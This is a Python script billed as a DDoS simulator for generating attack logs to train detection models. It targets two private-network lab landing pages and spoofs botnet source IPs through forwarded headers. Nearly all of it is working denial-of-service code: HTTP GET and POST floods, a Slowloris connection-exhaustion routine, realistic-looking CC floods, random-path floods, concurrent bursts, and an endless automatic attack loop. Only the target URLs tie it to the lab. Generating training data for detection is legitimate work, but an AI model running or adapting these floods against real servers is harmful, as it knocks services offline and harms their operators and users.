"""
DDoS Attack Simulator - Simulates DDoS attacks against two landing pages
=======================================================================

Purpose: Create realistic log patterns when a server is under DDoS,
                 supporting AI/ML training for attack detection.

Simulates "external hacking" by sending large volumes of HTTP requests
to both landing pages -> Nginx access logs capture everything -> Graylog ingests.

Architecture:
    Host (DDoS Simulator) -> HTTP Flood -> VM1 (Bootstrap LP) Nginx -> GELF -> Graylog
                                                 -> HTTP Flood -> VM2 (React LP)     Nginx -> GELF -> Graylog

Simulated DDoS attack types:
    1. HTTP GET Flood    - Flood GET requests to the same path at very high rate
    2. HTTP POST Flood   - Flood POST requests with large bodies
    3. Slowloris         - Open many connections, send headers very slowly (causes 408)
    4. CC Attack         - Realistic-looking traffic at massive volume
    5. Random Path Flood - GET requests to thousands of random paths
    6. Mixed DDoS        - Combine all types (most realistic)

DDoS indicators in logs (Graylog):
    - Hundreds of req/s from one IP (single-source DoS) or many IPs (X-Forwarded-For)
    - DDoS tool User-Agents: LOIC, GoldenEye, Hulk, Slowloris, ApacheBench...
    - Empty or abnormal User-Agents
    - One path hit repeatedly (GET Flood)
    - Continuous POST requests to the same endpoint
    - HTTP 408 (Request Timeout), 499 (Client Closed), 503 (Service Unavailable)
    - Sudden request-rate spike vs. baseline traffic

How to run:
    pip install requests
    python ddos_simulator.py                    # Menu to choose attack type
    python ddos_simulator.py --attack all       # Full mixed DDoS
    python ddos_simulator.py --attack flood     # HTTP GET Flood only
    python ddos_simulator.py --duration 120     # Attack for 120 seconds

⚠️  USE ONLY IN LAB / TRAINING ENVIRONMENTS ⚠️
"""

import requests
import time
import random
import string
import threading
import socket
import argparse
import sys
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# ============ TARGET CONFIGURATION ============
VM1_BOOTSTRAP = "http://192.168.31.129:8080"   # Prod-BootstrapLP
VM2_REACT = "http://192.168.31.130:3000"        # Prod-ReactLP

TARGETS = [
    {"name": "Prod-BootstrapLP", "url": VM1_BOOTSTRAP},
    {"name": "Prod-ReactLP", "url": VM2_REACT},
]

# ============ ATTACK INTENSITY ============
# LOW    = ~50 req/s   (light, easy to detect in logs)
# MEDIUM = ~150 req/s  (medium)
# HIGH   = ~300 req/s  (heavy, may cause 503/408)
# EXTREME = ~500+ req/s (extremely heavy, stress test)
INTENSITY = "MEDIUM"

INTENSITY_CONFIG = {
    "LOW":     {"threads": 10,  "delay_range": (0.05, 0.2),  "burst_threads": 20},
    "MEDIUM":  {"threads": 30,  "delay_range": (0.01, 0.08), "burst_threads": 50},
    "HIGH":    {"threads": 60,  "delay_range": (0.005, 0.03),"burst_threads": 100},
    "EXTREME": {"threads": 100, "delay_range": (0.001, 0.01),"burst_threads": 200},
}

# ============================================================
# USER-AGENTS CHARACTERISTIC OF DDoS TOOLS
# When these UAs appear in logs → clear signal of being under attack
# ============================================================
DDOS_TOOL_USER_AGENTS = [
    # -- DDoS Tools --
    "LOIC/2.0",                                          # Low Orbit Ion Cannon
    "HOIC/2.1",                                          # High Orbit Ion Cannon
    "GoldenEye/3.0",                                     # GoldenEye HTTP DoS
    "Hulk/1.0",                                          # HTTP Unbearable Load King
    "Slowloris/0.7",                                     # Slowloris attack tool
    "PyDDoS/1.0",                                        # Python DDoS script
    "TorsHammer/1.0",                                    # Tor's Hammer DoS
    "R-U-Dead-Yet/1.0",                                  # RUDY POST attack
    "Xerxes/2.0",                                        # Xerxes DoS tool
    # -- Stress Testing Tools (used in DDoS) --
    "ApacheBench/2.3",                                   # ab - Apache Benchmark
    "Siege/4.1.1",                                       # Siege HTTP load tester
    "Vegeta/12.8.4",                                     # Vegeta HTTP load testing
    "wrk/4.2.0",                                         # wrk HTTP benchmarking
    "hey/0.1.4",                                         # hey HTTP load generator
    "bombardier/1.2.5",                                  # bombardier HTTP benchmark
    "autocannon/7.12.0",                                 # autocannon HTTP benchmark
    "locust/2.20.0",                                     # Locust load testing
    # -- Abnormal --
    "",                                                  # Empty User-Agent
    "-",                                                 # Dash
    "Mozilla/4.0",                                       # Very old UA
    "botnet-node/1.0",                                   # Fake botnet signature
    "masscan/1.3",                                       # Mass scanner
    "ZmEu/1.0",                                          # ZmEu scanner
    "Nikto/2.1.6",                                       # Nikto web scanner
    "DirBuster/1.0",                                     # DirBuster
    "sqlmap/1.7",                                        # SQLMap
    "Nmap Scripting Engine",                              # Nmap NSE
]

# Fake IP pool - simulates botnet from multiple sources
# Will be sent via X-Forwarded-For header (Nginx will log if configured)
BOTNET_IPS = [
    # "Suspicious" IPs from around the world (botnet simulation)
    "45.33.32.156", "185.130.44.108", "91.219.236.174", "23.129.64.100",
    "171.25.193.77", "176.10.104.240", "185.220.101.45", "195.176.3.23",
    "199.249.230.87", "209.141.45.30", "185.56.80.65", "103.15.28.215",
    "27.124.17.10", "36.66.194.201", "41.78.26.121", "58.218.198.160",
    "61.177.172.33", "77.247.181.162", "80.82.77.33", "89.248.167.131",
    "93.174.95.106", "112.85.42.88", "118.193.15.211", "123.132.68.41",
    "141.212.122.0", "159.203.176.1", "162.247.74.27", "178.20.55.18",
    "182.100.67.114", "192.42.116.16", "198.96.155.3", "220.181.38.148",
]

# Request counter (thread-safe)
_request_count = 0
_request_lock = threading.Lock()
_error_count = 0
_error_lock = threading.Lock()
_start_time = None

def inc_request():
    global _request_count
    with _request_lock:
        _request_count += 1
    return _request_count

def inc_error():
    global _error_count
    with _error_lock:
        _error_count += 1
    return _error_count


# ============================================================
# ATTACK 1: HTTP GET FLOOD
# Send hundreds of GET requests/second to same endpoint
# Log pattern: Same path "GET /" repeated hundreds of times/second
# ============================================================
def attack_http_get_flood(target_url, duration, config):
    """
    HTTP GET Flood - Most common DDoS attack type
    
    Send continuous GET requests to root path (/) or specific paths.
    Each request uses random User-Agent from DDoS tools.
    
    Indicators in logs:
      - Hundreds of "GET / HTTP/1.1" lines in 1 second
      - User-Agent: LOIC/2.0, GoldenEye/3.0, Hulk/1.0, etc.
      - All from same remote_addr
    """
    flood_paths = ["/", "/", "/", "/index.html", "/#features", "/#signup"]
    end_time = time.time() + duration
    
    while time.time() < end_time:
        try:
            path = random.choice(flood_paths)
            ua = random.choice(DDOS_TOOL_USER_AGENTS)
            fake_ip = random.choice(BOTNET_IPS)
            headers = {
                "User-Agent": ua,
                "X-Forwarded-For": fake_ip,
                "X-Real-IP": fake_ip,
            }
            requests.get(
                f"{target_url}{path}",
                headers=headers,
                timeout=3,
                allow_redirects=False
            )
            count = inc_request()
            
            # Print attack pattern periodically to make it visible in the terminal.
            if count % 50 == 0:  # Print once per 50 requests.
                timestamp = datetime.now().strftime("%H:%M:%S")
                target_name = "BootstrapLP" if "8080" in target_url else "ReactLP"
                print(f"  [{timestamp}] 🔴 DDoS FLOOD → {target_name}: GET {path} | UA: {ua[:30]}... | IP: {fake_ip}")
        except:
            inc_error()
        
        delay_min, delay_max = config["delay_range"]
        time.sleep(random.uniform(delay_min, delay_max))


# ============================================================
# ATTACK 2: HTTP POST FLOOD
# Send continuous POST requests with large body data
# Log pattern: Many "POST /login" or "POST /contact" with 405/413
# ============================================================
def attack_http_post_flood(target_url, duration, config):
    """
    HTTP POST Flood - Attack via POST requests
    
    Send continuous POST requests to form endpoints.
    Large body data consumes bandwidth and server processing.
    
    Indicators in logs:
      - Many "POST /login HTTP/1.1" 405 (Method Not Allowed because Nginx static)
      - Continuous "POST /contact HTTP/1.1" 405
      - Same DDoS tool User-Agent
    """
    post_paths = [
        "/login", "/admin/login", "/contact", "/api/submit",
        "/register", "/signup", "/search", "/upload",
        "/comment", "/feedback", "/subscribe", "/checkout",
    ]
    end_time = time.time() + duration
    
    # Generate random large body data
    def random_body():
        size = random.randint(1000, 50000)  # 1KB - 50KB
        return {
            "data": ''.join(random.choices(string.ascii_letters + string.digits, k=size)),
            "username": ''.join(random.choices(string.ascii_lowercase, k=8)),
            "password": ''.join(random.choices(string.ascii_letters, k=16)),
            "token": ''.join(random.choices(string.hexdigits, k=32)),
        }
    
    while time.time() < end_time:
        try:
            path = random.choice(post_paths)
            ua = random.choice(DDOS_TOOL_USER_AGENTS)
            fake_ip = random.choice(BOTNET_IPS)
            body_size = random.randint(1000, 50000)
            headers = {
                "User-Agent": ua,
                "X-Forwarded-For": fake_ip,
                "Content-Type": "application/x-www-form-urlencoded",
            }
            requests.post(
                f"{target_url}{path}",
                data=random_body(),
                headers=headers,
                timeout=3,
                allow_redirects=False
            )
            count = inc_request()
            
            if count % 30 == 0:
                timestamp = datetime.now().strftime("%H:%M:%S")
                target_name = "BootstrapLP" if "8080" in target_url else "ReactLP"
                print(f"  [{timestamp}] 🔴 POST FLOOD → {target_name}: POST {path} [{body_size//1024}KB] | UA: {ua[:30]}...")
        except:
            inc_error()
        
        delay_min, delay_max = config["delay_range"]
        time.sleep(random.uniform(delay_min, delay_max))


# ============================================================
# ATTACK 3: SLOWLORIS
# Open TCP connections and send headers slowly → keep connections open
# Log pattern: Nginx returns 408 Request Timeout when connection held too long
# ============================================================
def attack_slowloris(target_url, duration, config):
    """
    Slowloris - Connection Exhaustion attack
    
    Open many TCP sockets, send partial HTTP headers very slowly,
    keep connection alive → exhausts Nginx worker connections.
    
    Indicators in logs:
      - Many 408 Request Timeout occurrences
      - Incomplete requests
      - Nginx error_log: "client timed out"
    """
    # Parse host and port from URL
    from urllib.parse import urlparse
    parsed = urlparse(target_url)
    host = parsed.hostname
    port = parsed.port or 80
    
    sockets = []
    end_time = time.time() + duration
    
    def create_socket():
        """Create one socket connection and send a partial HTTP request."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((host, port))
            # Send a partial HTTP request (no trailing \r\n\r\n -> server waits).
            fake_ip = random.choice(BOTNET_IPS)
            ua = random.choice(["Slowloris/0.7", "Mozilla/5.0", ""])
            s.send(f"GET /?{random.randint(1,99999)} HTTP/1.1\r\n".encode())
            s.send(f"Host: {host}\r\n".encode())
            s.send(f"User-Agent: {ua}\r\n".encode())
            s.send(f"X-Forwarded-For: {fake_ip}\r\n".encode())
            s.send(f"Accept-language: en-US,en;q=0.5\r\n".encode())
            return s
        except:
            inc_error()
            return None
    
    # Create initial socket batch
    num_sockets = min(config["burst_threads"], 150)
    timestamp = datetime.now().strftime("%H:%M:%S")
    target_name = "BootstrapLP" if "8080" in target_url else "ReactLP"
    print(f"  [{timestamp}] ⚡ SLOWLORIS → {target_name}: Opening {num_sockets} slow connections...")
    
    for _ in range(num_sockets):
        s = create_socket()
        if s:
            sockets.append(s)
            inc_request()
    
    while time.time() < end_time:
        # Keep connections alive by sending extra headers every few seconds.
        for s in list(sockets):
            try:
                # Send an extra header to keep the connection open.
                header_name = ''.join(random.choices(string.ascii_letters, k=8))
                s.send(f"X-{header_name}: {random.randint(1, 5000)}\r\n".encode())
                inc_request()
            except:
                sockets.remove(s)
                inc_error()
        
        # Replace sockets that were closed.
        diff = num_sockets - len(sockets)
        for _ in range(diff):
            s = create_socket()
            if s:
                sockets.append(s)
        
        # Status update
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"  [{timestamp}] ⚡ SLOWLORIS → {target_name}: {len(sockets)}/{num_sockets} connections kept alive (causing 408 Timeout)")
        
        time.sleep(random.uniform(3, 8))  # Slowloris is slow by design; wait 3-8s.
    
    # Cleanup
    for s in sockets:
        try:
            s.close()
        except:
            pass


# ============================================================
# ATTACK 4: CC ATTACK (Challenge Collapsar)
# Simulate "realistic-looking" traffic but with extremely large volume
# Log pattern: GET requests look like real users but extremely high RPS, many real User-Agents
# ============================================================
def attack_cc(target_url, duration, config, is_bootstrap=True):
    """
    CC Attack (Challenge Collapsar) - "Realistic-looking traffic" DDoS
    
    Requests look like real users (real User-Agent, valid paths)
    but with extremely large volume → hard to distinguish from real traffic.
    
    Indicators in logs:
      - Abnormally high request rate (100x normal)
      - Strange Referer patterns
      - Same IP source with request rate impossible for human
    """
    # Use User-Agent like real browsers (harder to detect)
    real_user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edg/120.0.0.0",
    ]
    
    if is_bootstrap:
        paths = ["/", "/index.html", "/css/styles.css", "/js/scripts.js",
                 "/#features", "/#testimonials", "/#signup",
                 "/assets/img/bg-masthead.jpg", "/assets/img/bg-showcase-1.jpg"]
    else:
        paths = ["/", "/home", "/about", "/services", "/contact", "/portfolio",
                 "/pricing", "/static/css/main.css", "/static/js/main.js"]
    
    referers = [
        "https://www.google.com/search?q=landing+page",
        "https://www.facebook.com/",
        "https://twitter.com/",
        "https://www.reddit.com/r/webdev/",
        "-",
    ]
    
    end_time = time.time() + duration
    session = requests.Session()  # Use session to reuse connection (faster)
    
    while time.time() < end_time:
        try:
            path = random.choice(paths)
            ua = random.choice(real_user_agents)
            fake_ip = random.choice(BOTNET_IPS)
            headers = {
                "User-Agent": ua,
                "X-Forwarded-For": fake_ip,
                "Referer": random.choice(referers),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "keep-alive",
            }
            session.get(
                f"{target_url}{path}",
                headers=headers,
                timeout=3,
                allow_redirects=True
            )
            count = inc_request()
            
            if count % 100 == 0:
                timestamp = datetime.now().strftime("%H:%M:%S")
                target_name = "BootstrapLP" if is_bootstrap else "ReactLP"
                print(f"  [{timestamp}] 🔴 CC ATTACK → {target_name}: {path} | Looks like real traffic but HIGH RPS!")
        except:
            inc_error()
        
        # CC attack is faster than normal traffic, but not too fast.
        delay_min, delay_max = config["delay_range"]
        time.sleep(random.uniform(delay_min * 2, delay_max * 2))


# ============================================================
# ATTACK 5: RANDOM PATH FLOOD
# Flood requests to thousands of random paths → causes continuous 404s
# Log pattern: Hundreds of "GET /random_gibberish" 404 in 1 second
# ============================================================
def attack_random_path_flood(target_url, duration, config):
    """
    Random Path Flood - Flood to random paths
    
    Generate thousands of random URL paths, send continuous GETs.
    Server must process each request → consumes resources.
    
    Indicators in logs:
      - Hundreds of different paths, no specific pattern
      - All return 200 (because Nginx try_files → /index.html) or 404
      - Extremely high request rate
    """
    def random_path():
        """Generate random URL paths like attacker tools do"""
        patterns = [
            # Random file names
            f"/{''.join(random.choices(string.ascii_lowercase, k=random.randint(3,15)))}.{random.choice(['php', 'asp', 'jsp', 'cgi', 'html', 'txt'])}",
            # Random directory traversal
            f"/{''.join(random.choices(string.ascii_lowercase, k=5))}/{''.join(random.choices(string.ascii_lowercase, k=8))}",
            # Random API endpoints
            f"/api/v{random.randint(1,3)}/{''.join(random.choices(string.ascii_lowercase, k=8))}",
            # Random with query strings
            f"/page?id={random.randint(1, 999999)}&action={''.join(random.choices(string.ascii_lowercase, k=5))}",
            # WordPress-style enumeration
            f"/wp-content/plugins/{''.join(random.choices(string.ascii_lowercase, k=10))}/",
            # Random admin paths
            f"/admin/{''.join(random.choices(string.ascii_lowercase, k=8))}",
            # Random backup files
            f"/backup_{random.randint(2020,2026)}.{''.join(random.choices(['sql','tar.gz','zip','bak'], k=1)[0])}",
        ]
        return random.choice(patterns)
    
    end_time = time.time() + duration
    
    while time.time() < end_time:
        try:
            path = random_path()
            ua = random.choice(DDOS_TOOL_USER_AGENTS)
            fake_ip = random.choice(BOTNET_IPS)
            headers = {
                "User-Agent": ua,
                "X-Forwarded-For": fake_ip,
            }
            requests.get(
                f"{target_url}{path}",
                headers=headers,
                timeout=3,
                allow_redirects=False
            )
            count = inc_request()
            
            if count % 40 == 0:
                timestamp = datetime.now().strftime("%H:%M:%S")
                target_name = "BootstrapLP" if "8080" in target_url else "ReactLP"
                print(f"  [{timestamp}] 🔴 RANDOM PATH → {target_name}: {path} | UA: {ua[:25]}...")
        except:
            inc_error()
        
        delay_min, delay_max = config["delay_range"]
        time.sleep(random.uniform(delay_min, delay_max))


# ============================================================
# ATTACK 6: BURST ATTACK (Spike DDoS)
# Send hundreds of requests simultaneously in one burst (concurrent burst)
# Log pattern: Hundreds of log lines with same exact timestamp
# ============================================================
def attack_burst(target_url, duration, config):
    """
    Burst/Spike DDoS - Send hundreds of requests simultaneously
    
    Use ThreadPoolExecutor to send hundreds of requests in parallel at once,
    rest a bit, then burst again. Similar to real botnet patterns.
    
    Indicators in logs:
      - Hundreds of log lines with same timestamp (same second)
      - Then gap of few seconds, then burst again
      - Mix of different User-Agents
    """
    end_time = time.time() + duration
    burst_size = config["burst_threads"]
    
    def single_burst_request(target_url):
        try:
            path = random.choice(["/", "/index.html", "/#features", "/about", "/services"])
            ua = random.choice(DDOS_TOOL_USER_AGENTS)
            fake_ip = random.choice(BOTNET_IPS)
            headers = {
                "User-Agent": ua,
                "X-Forwarded-For": fake_ip,
            }
            requests.get(
                f"{target_url}{path}",
                headers=headers,
                timeout=5,
                allow_redirects=False
            )
            inc_request()
        except:
            inc_error()
    
    while time.time() < end_time:
        timestamp = datetime.now().strftime("%H:%M:%S")
        target_name = "BootstrapLP" if "8080" in target_url else "ReactLP"
        print(f"  [{timestamp}] ⚡⚡⚡ BURST ATTACK → {target_name}: Sending {burst_size} concurrent requests...")
        
        # Send a burst: hundreds of concurrent requests.
        with ThreadPoolExecutor(max_workers=burst_size) as executor:
            futures = [
                executor.submit(single_burst_request, target_url)
                for _ in range(burst_size)
            ]
            for f in as_completed(futures):
                pass  # Wait for all to complete.
        
        print(f"  [{timestamp}] ⚡⚡⚡ BURST COMPLETE → {target_name}: {burst_size} requests sent in <1 second!")
        
        # Short pause between bursts (1-3 seconds).
        time.sleep(random.uniform(1, 3))


# ============================================================
# MONITORING - Display real-time stats
# ============================================================
def monitor_stats(duration):
    """Print real-time statistics of the attack"""
    global _start_time
    _start_time = time.time()
    end_time = _start_time + duration
    last_count = 0
    
    while time.time() < end_time:
        elapsed = time.time() - _start_time
        if elapsed > 0:
            rps = _request_count / elapsed
            timestamp = datetime.now().strftime("%H:%M:%S")
            remaining = int(end_time - time.time())
            
            # Calculate the burst in the last second.
            burst_rps = _request_count - last_count
            last_count = _request_count
            
            # Warning level based on RPS
            if rps > 300:
                warning = "🔴 EXTREME ATTACK"
            elif rps > 150:
                warning = "🔴 HIGH ATTACK"
            elif rps > 50:
                warning = "⚠️  MEDIUM ATTACK"
            else:
                warning = "🟡 LOW ATTACK"
            
            print(
                f"\r  [{timestamp}] {warning} | "
                f"Total: {_request_count:,} reqs | "
                f"Avg RPS: {rps:.0f}/s | "
                f"Burst: {burst_rps}/s | "
                f"Errors: {_error_count:,} | "
                f"Time left: {remaining}s     ",
                end="", flush=True
            )
        time.sleep(1)
    
    # Final stats
    print()  # New line
    elapsed = time.time() - _start_time
    rps = _request_count / elapsed if elapsed > 0 else 0
    print()
    print("=" * 65)
    print(f"  🔴 DDoS ATTACK SUMMARY")
    print("=" * 65)
    print(f"  Total Requests Sent:  {_request_count:,}")
    print(f"  Average RPS:          {rps:.0f} req/s")
    print(f"  Failed Requests:      {_error_count:,}")
    print(f"  Attack Duration:      {elapsed:.0f} seconds")
    if _request_count > 0:
        print(f"  Success Rate:         {(_request_count-_error_count)/_request_count*100:.1f}%")
    print("=" * 65)


# ============================================================
# MIXED DDoS - Combines all attack types (most realistic!)
# ============================================================
def attack_mixed(targets, duration, config):
    """
    Mixed DDoS Attack - Combines multiple attack types simultaneously
    
    Runs in parallel:
      - HTTP GET Flood to both targets
      - HTTP POST Flood to both targets
      - Slowloris to both targets
      - CC Attack to both targets
      - Random Path Flood to both targets
      - Random Burst Attacks
    
    This is the most realistic attack type because real DDoS usually mixes multiple vectors.
    """
    threads = []
    
    for target in targets:
        url = target["url"]
        name = target["name"]
        is_bootstrap = "Bootstrap" in name
        
        # GET Flood - 3 threads per target
        for _ in range(3):
            threads.append(threading.Thread(
                target=attack_http_get_flood,
                args=(url, duration, config),
                daemon=True
            ))
        
        # POST Flood - 2 threads per target
        for _ in range(2):
            threads.append(threading.Thread(
                target=attack_http_post_flood,
                args=(url, duration, config),
                daemon=True
            ))
        
        # Slowloris - 1 thread per target
        threads.append(threading.Thread(
            target=attack_slowloris,
            args=(url, duration, config),
            daemon=True
        ))
        
        # CC Attack - 2 threads per target
        for _ in range(2):
            threads.append(threading.Thread(
                target=attack_cc,
                args=(url, duration, config, is_bootstrap),
                daemon=True
            ))
        
        # Random Path Flood - 2 threads per target
        for _ in range(2):
            threads.append(threading.Thread(
                target=attack_random_path_flood,
                args=(url, duration, config),
                daemon=True
            ))
        
        # Burst Attack - 1 thread per target
        threads.append(threading.Thread(
            target=attack_burst,
            args=(url, duration, config),
            daemon=True
        ))
    
    return threads


# ============================================================
# MAIN - Automatic continuous DDoS attack mode
# ============================================================
def main():
    global _request_count, _error_count, INTENSITY
    
    parser = argparse.ArgumentParser(description="DDoS Attack Simulator - Automatic Mode")
    parser.add_argument("--manual", action="store_true",
                       help="Enable manual mode (choose attack type)")
    args = parser.parse_args()
    
    # Always attack BOTH servers simultaneously
    active_targets = TARGETS
    
    print()
    print("=" * 80)
    print("  ⚡ DDoS ATTACK SIMULATOR - AUTOMATIC CONTINUOUS MODE")
    print("  ⚠️  USE ONLY IN LAB / TRAINING ENVIRONMENT ⚠️")
    print("=" * 80)
    print()
    print("  🎯 Available Targets:")
    for t in active_targets:
        print(f"    → {t['name']}: {t['url']}")
    print()
    
    # Check connectivity
    print("[*] Checking target connectivity...")
    all_online = True
    for target in active_targets:
        try:
            resp = requests.get(target["url"], timeout=5, allow_redirects=True)
            print(f"  ✓ {target['name']}: ONLINE (HTTP {resp.status_code})")
        except Exception as e:
            print(f"  ✗ {target['name']}: OFFLINE - {e}")
            print(f"    >> Ensure VM is running!")
            all_online = False
    
    if not all_online:
        print("\n  [!] Some targets are offline. Exiting...")
        sys.exit(1)
    
    print()
    print("=" * 80)
    print("  🔴 AUTOMATIC DDoS MODE - Attacks will launch randomly")
    print("=" * 80)
    print("  Mode: Random attack type → Random server (1 type, 1 server per attack)")
    print("  Attack Duration: 30-90 seconds (random per attack)")
    print("  Interval Between Attacks: 10-30 seconds (random)")
    print("  Attack Intensity: Random (LOW/MEDIUM/HIGH)")
    print()
    print("  Press Ctrl+C to stop")
    print("=" * 80)
    print()
    
    # Automatic attack loop
    attack_types = ["flood", "post", "slowloris", "cc", "random", "burst"]
    attack_names = {
        "flood": "HTTP GET Flood",
        "post": "HTTP POST Flood",
        "slowloris": "Slowloris Connection Exhaustion",
        "cc": "CC Attack (Realistic Traffic)",
        "random": "Random Path Flood",
        "burst": "Burst/Spike Attack",
    }
    intensities = ["LOW", "MEDIUM", "HIGH"]
    
    attack_count = 0
    total_requests_all = 0
    total_errors_all = 0
    
    try:
        while True:
            attack_count += 1
            
            # Randomly select ONE server for this attack
            selected_target = random.choice(active_targets)
            
            # Randomly select ONE attack type (no mixed "all")
            attack_choice = random.choice(attack_types)
            
            # Random intensity (favor MEDIUM and HIGH)
            intensity = random.choices(
                intensities,
                weights=[2, 5, 3],  # LOW=20%, MEDIUM=50%, HIGH=30%
                k=1
            )[0]
            INTENSITY = intensity
            config = INTENSITY_CONFIG[INTENSITY]
            
            # Random duration (30-90 seconds)
            duration = random.randint(30, 90)
            
            # Reset counters for this attack
            _request_count = 0
            _error_count = 0
            
            # Print attack header
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            print()
            print("▼" * 80)
            print(f"  🔴 DDoS ATTACK #{attack_count} STARTING")
            print("▼" * 80)
            print(f"  Timestamp:  {timestamp}")
            print(f"  Type:       {attack_names[attack_choice]}")
            print(f"  Intensity:  {intensity} ({config['threads']} threads, burst={config['burst_threads']})")
            print(f"  Duration:   {duration} seconds")
            print(f"  🎯 Target:  {selected_target['name']} ({selected_target['url']})")
            print("─" * 80)
            
            # Launch attack threads for SINGLE server only
            threads = []
            
            attack_funcs = {
                "flood": attack_http_get_flood,
                "post": attack_http_post_flood,
                "slowloris": attack_slowloris,
                "cc": lambda url, dur, cfg: attack_cc(url, dur, cfg, "Bootstrap" in selected_target['name']),
                "random": attack_random_path_flood,
                "burst": attack_burst,
            }
            
            func = attack_funcs[attack_choice]
            num_threads = config["threads"]
            
            # Create threads for the selected target only
            for _ in range(num_threads):
                threads.append(threading.Thread(
                    target=func,
                    args=(selected_target["url"], duration, config),
                    daemon=True
                ))
    
            # Monitor thread
            monitor_thread = threading.Thread(
                target=monitor_stats,
                args=(duration,),
                daemon=True
            )
            
            # Start attack
            monitor_thread.start()
            for t in threads:
                t.start()
            
            # Wait for attack to complete
            monitor_thread.join()
            time.sleep(2)  # Buffer for threads to finish
            
            # Attack summary
            elapsed = time.time() - _start_time if _start_time else duration
            rps = _request_count / elapsed if elapsed > 0 else 0
            success_rate = (_request_count - _error_count) / _request_count * 100 if _request_count > 0 else 0
            
            total_requests_all += _request_count
            total_errors_all += _error_count
            
            print()
            print("▲" * 80)
            print(f"  ✓ DDoS ATTACK #{attack_count} COMPLETED")
            print("▲" * 80)
            print(f"  Requests:      {_request_count:,} ({rps:.0f} req/s avg)")
            print(f"  Errors:        {_error_count:,}")
            print(f"  Success Rate:  {success_rate:.1f}%")
            print(f"  Duration:      {elapsed:.0f}s")
            print("─" * 80)
            print(f"  📊 Total Stats: {total_requests_all:,} requests | {total_errors_all:,} errors | {attack_count} attacks")
            print("=" * 80)
            
            # Random interval before next attack (10-30 seconds)
            interval = random.randint(10, 30)
            timestamp = datetime.now().strftime("%H:%M:%S")
            print(f"  [{timestamp}] 💤 Waiting {interval}s before next attack...")
            print()
            
            time.sleep(interval)
            
    except KeyboardInterrupt:
        print("\n\n")
        print("=" * 80)
        print("  🛑 AUTOMATIC DDoS MODE STOPPED")
        print("=" * 80)
        print(f"  Total Attacks Launched:  {attack_count}")
        print(f"  Total Requests Sent:     {total_requests_all:,}")
        print(f"  Total Errors:            {total_errors_all:,}")
        if total_requests_all > 0:
            print(f"  Overall Success Rate:    {(total_requests_all-total_errors_all)/total_requests_all*100:.1f}%")
        print()
        print("  Check logs in Graylog (http://localhost:9000)")
        print("  or files: log-output/Prod-BootstrapLP.log")
        print("            log-output/Prod-ReactLP.log")
        print("=" * 80)


if __name__ == "__main__":
    main()
